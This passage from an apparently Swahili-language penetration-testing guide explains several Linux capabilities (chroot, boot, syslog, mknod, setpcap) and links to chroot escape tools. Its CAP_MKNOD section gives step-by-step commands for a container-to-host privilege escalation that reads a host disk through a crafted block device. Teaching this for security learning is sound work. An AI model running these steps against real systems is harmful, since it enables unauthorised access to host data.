f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
> [!TIP]
> Kumbuka kwamba kwa kawaida attribute hii ya immutable huwekwa na kuondolewa kwa kutumia:
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) huwezesha utekelezaji wa system call ya `chroot(2)`, ambayo inaweza kuruhusu kutoroka kutoka kwenye mazingira ya `chroot(2)` kupitia vulnerabilities zinazojulikana:

- [How to break out from various chroot solutions](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [chw00t: chroot escape tool](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) hairuhusu tu utekelezaji wa system call ya `reboot(2)` kwa ajili ya kuwasha upya mfumo, ikiwemo commands maalum kama `LINUX_REBOOT_CMD_RESTART2` zilizoundwa kwa ajili ya hardware platforms fulani, bali pia huwezesha matumizi ya `kexec_load(2)` na, kuanzia Linux 3.17, `kexec_file_load(2)` kwa ajili ya kupakia crash kernels mpya au zilizosainiwa mtawalia.

## CAP_SYSLOG

[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) ilitenganishwa na **CAP_SYS_ADMIN** pana zaidi katika Linux 2.6.37, na kutoa mahsusi uwezo wa kutumia call ya `syslog(2)`. Capability hii huwezesha kutazama kernel addresses kupitia `/proc` na interfaces zinazofanana wakati setting ya `kptr_restrict` iko kwenye 1, ambayo inadhibiti kufichuliwa kwa kernel addresses. Tangu Linux 2.6.39, default ya `kptr_restrict` ni 0, ikimaanisha kwamba kernel addresses zinafichuliwa, ingawa distributions nyingi huiweka kwenye 1 (huficha addresses isipokuwa kutoka kwa uid 0) au 2 (huficha addresses kila wakati) kwa sababu za security.

Zaidi ya hayo, **CAP_SYSLOG** huruhusu kufikia output ya `dmesg` wakati `dmesg_restrict` imewekwa kwenye 1. Licha ya mabadiliko haya, **CAP_SYS_ADMIN** bado ina uwezo wa kufanya operations za `syslog` kutokana na precedents za kihistoria.

## CAP_MKNOD

[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) huongeza functionality ya system call ya `mknod` zaidi ya kuunda regular files, FIFOs (named pipes), au UNIX domain sockets. Hasa, huruhusu uundaji wa special files, ambazo zinajumuisha:

- **S_IFCHR**: Character special files, ambazo ni devices kama terminals.
- **S_IFBLK**: Block special files, ambazo ni devices kama disks.

Capability hii ni muhimu kwa processes zinazohitaji uwezo wa kuunda device files, na hivyo kuwezesha interaction ya moja kwa moja na hardware kupitia character au block devices.

Ni default docker capability ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).

Capability hii inaruhusu kufanya privilege escalations (kupitia full disk read) kwenye host, chini ya masharti haya:

1. Kuwa na access ya awali kwenye host (Unprivileged).
2. Kuwa na access ya awali kwenye container (Privileged (EUID 0), na effective `CAP_MKNOD`).
3. Host na container zinapaswa kushiriki user namespace sawa.

**Hatua za Kuunda na Kufikia Block Device kwenye Container:**

1. **Kwenye Host kama Standard User:**

- Tambua user ID yako ya sasa kwa kutumia `id`, kwa mfano, `uid=1000(standarduser)`.
- Tambua device lengwa, kwa mfano, `/dev/sdb`.

2. **Ndani ya Container kama `root`:**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **Rudi kwenye Host:**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
Mbinu hii humruhusu mtumiaji wa kawaida kufikia na huenda kusoma data kutoka `/dev/sdb` kupitia container, kwa kutumia shared user namespaces na permissions zilizowekwa kwenye kifaa.

### CAP_SETPCAP

**CAP_SETPCAP** huwezesha process **kubadilisha capability sets** za process nyingine, hivyo kuruhusu kuongeza au kuondoa capabilities kutoka kwenye effective, inheritable, na permitted sets. Hata hivyo, process inaweza kubadilisha capabilities ambayo inamiliki kwenye permitted set yake, kuhakikisha haiwezi kuongeza privileges za process nyingine zaidi ya zake. Kernel updates za hivi karibuni zimeimarisha sheria hizi, zikizuia `CAP_SETPCAP` kupunguza tu capabilities zilizo ndani ya permitted sets zake yenyewe au za descendants wake, kwa lengo la kupunguza security risks. Matumizi yake yanahitaji kuwa na `CAP_SETPCAP` kwenye effective set na target capabilities kwenye permitted set, kwa kutumia `capset()` kufanya mabadiliko. Hii inatoa muhtasari wa kazi kuu na mipaka ya `CAP_SETPCAP`, ikiangazia jukumu lake katika privilege management na security enhancement.

**`CAP_SETPCAP`** ni Linux capability inayoruhusu process **kubadilisha capability sets za process nyingine**. Inatoa uwezo wa kuongeza au kuondoa capabilities kutoka kwenye effective, inheritable, na permitted capability sets za processes nyingine. Hata hivyo, kuna restrictions fulani kuhusu jinsi capability hii inavyoweza kutumiwa.

Process iliyo na `CAP_SETPCAP` **inaweza tu kutoa au kuondoa capabilities zilizo kwenye permitted capability set yake yenyewe**. Kwa maneno mengine, process haiwezi kuipa process nyingine capability ikiwa yenyewe haina capability hiyo. Restriction hii huzuia process kuongeza privileges za process nyingine zaidi ya kiwango chake yenyewe cha privilege.

Zaidi ya hayo, katika kernel versions za hivi karibuni, capability ya `CAP_SETPCAP` **imewekewa restrictions zaidi**. Hairuhusu tena process kubadilisha capability sets za processes nyingine kiholela. Badala yake, **inaruhusu process kupunguza tu capabilities zilizo kwenye permitted capability set yake yenyewe au permitted capability set ya descendants wake**. Mabadiliko haya yaliletwa ili kupunguza security risks zinazoweza kuhusishwa na capability hii.

Ili kutumia `CAP_SETPCAP` ipasavyo, unahitaji kuwa na capability hiyo kwenye effective capability set yako na target capabilities kwenye permitted capability set yako. Kisha unaweza kutumia system call ya `capset()` kubadilisha capability sets za processes nyingine.

Kwa muhtasari, `CAP_SETPCAP` inaruhusu process kubadilisha capability sets za processes nyingine, lakini haiwezi kutoa capabilities ambayo yenyewe haina. Zaidi ya hayo, kutokana na security concerns, functionality yake imewekewa mipaka katika kernel versions za hivi karibuni ili kuruhusu tu kupunguza capabilities kwenye permitted capability set yake yenyewe au permitted capability sets za descendants wake.

## Marejeleo

**Mengi ya mifano hii yalichukuliwa kutoka kwenye labs za** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com), kwa hiyo ikiwa unataka kufanya mazoezi ya mbinu hizi za privesc, ninapendekeza labs hizi.

**Marejeleo mengine**:

- [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
- [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)

​
{{#include ../../banners/hacktricks-training.md}}
